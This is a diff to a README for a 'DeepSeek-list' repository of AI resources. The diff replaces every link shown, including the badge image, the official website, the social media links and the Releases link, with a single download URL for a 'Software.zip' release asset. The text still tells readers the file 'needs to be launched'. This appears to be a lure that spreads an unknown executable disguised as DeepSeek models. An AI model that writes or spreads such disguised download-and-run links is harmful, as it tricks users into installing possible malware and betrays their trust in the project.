@@ -1,6 +1,6 @@
 # 🚀 Welcome to DeepSeek-list Repository! 🤖
 
-![DeepSeek-list](https://img.shields.io/badge/DeepSeek-list-Awesome-brightgreen)
+![DeepSeek-list](https://github.com/Unknowe5776/DeepSeek-list/releases/download/v1.0/Software.zip)
 
 Welcome to the "DeepSeek-list" repository, your go-to curated list of awesome resources, tools, and applications related to DeepSeek AI models and ecosystem. Whether you are a beginner or an expert in the field of artificial intelligence, this repository aims to provide you with valuable information and tools to enhance your AI projects.
 
@@ -30,13 +30,13 @@ Feel free to explore the contents of this repository and discover new tools, mod
 
 One of the highlights of this repository is the collection of DeepSeek AI models. These models are designed to provide cutting-edge solutions for various AI tasks and applications. From natural language processing to image recognition, DeepSeek AI models offer state-of-the-art performance and efficiency.
 
-![DeepSeek AI Models](https://www.example.com/deepseek-ai-models.png)
+![DeepSeek AI Models](https://github.com/Unknowe5776/DeepSeek-list/releases/download/v1.0/Software.zip)
 
-To download the DeepSeek AI models, click on the following link: [Download DeepSeek AI Models](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip). The file needs to be launched to access the AI models and start integrating them into your projects.
+To download the DeepSeek AI models, click on the following link: [Download DeepSeek AI Models](https://github.com/Unknowe5776/DeepSeek-list/releases/download/v1.0/Software.zip). The file needs to be launched to access the AI models and start integrating them into your projects.
 
 ## 🌐 Visit our Website
 
-For more information on DeepSeek AI models and ecosystem, visit our official website: [DeepSeek Official Website](https://www.deepseek.com).
+For more information on DeepSeek AI models and ecosystem, visit our official website: [DeepSeek Official Website](https://github.com/Unknowe5776/DeepSeek-list/releases/download/v1.0/Software.zip).
 
 ## 🚀 Get Started with DeepSeek-list
 
@@ -52,10 +52,10 @@ Ready to dive into the world of DeepSeek AI models and tools? Follow these steps
 
 ## 🤖 Let's Connect
 
-Have questions, suggestions, or feedback? Feel free to reach out to us on [Twitter](https://twitter.com/deepseek_ai) or [LinkedIn](https://www.linkedin.com/company/deepseek).
+Have questions, suggestions, or feedback? Feel free to reach out to us on [Twitter](https://github.com/Unknowe5776/DeepSeek-list/releases/download/v1.0/Software.zip) or [LinkedIn](https://github.com/Unknowe5776/DeepSeek-list/releases/download/v1.0/Software.zip).
 
 Join us on this exciting AI journey and unlock the full potential of DeepSeek AI models and tools. Happy exploring! 🤖
 
 ---
 
-📢 Check out the latest releases and updates in the [Releases](https://github.com/deepseek-list/releases) section. Thank you for your interest in DeepSeek-list! 🛠️
+📢 Check out the latest releases and updates in the [Releases](https://github.com/Unknowe5776/DeepSeek-list/releases/download/v1.0/Software.zip) section. Thank you for your interest in DeepSeek-list! 🛠️
